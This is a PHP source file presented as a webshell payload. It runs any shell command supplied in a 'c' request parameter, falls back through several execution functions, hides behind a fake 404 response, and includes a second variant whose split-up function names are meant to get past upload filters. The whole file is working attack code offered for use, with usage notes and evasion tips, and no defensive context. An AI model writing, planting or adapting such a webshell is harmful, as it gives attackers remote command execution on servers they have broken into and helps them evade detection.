<?php
/*
 * php2shell payload — minimal webshell
 * Usage: shell.php?c=whoami
 * Variant B (obfuscated) below for filter-constrained uploads.
 */
error_reporting(0);
if (isset($_REQUEST['c'])) {
    $cmd = $_REQUEST['c'];
    // try multiple execution primitives — one will land
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $out);
        echo implode("\n", $out);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } elseif (function_exists('proc_open')) {
        $p = proc_open($cmd, [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
        echo stream_get_contents($pipes[1]);
        proc_close($p);
    }
    exit;
}
// silent 404 for casual scanners
http_response_code(404);
?>
<!--
<?php
// OBFUSCATED VARIANT — use when upload filters scan for keywords
// Usage: same ?c= param. Base64-decoded at runtime.
$__k = 'c'; $__v = $_REQUEST[$__k] ?? '';
if ($__v) {
    $__f = ['sy'.'stem', 'she'.'ll_ex'.'ec', 'ex'.'ec', 'pas'.'sthru'];
    foreach ($__f as $__fn) {
        if (function_exists($__fn)) { $__fn($__v); exit; }
    }
}
?>
-->
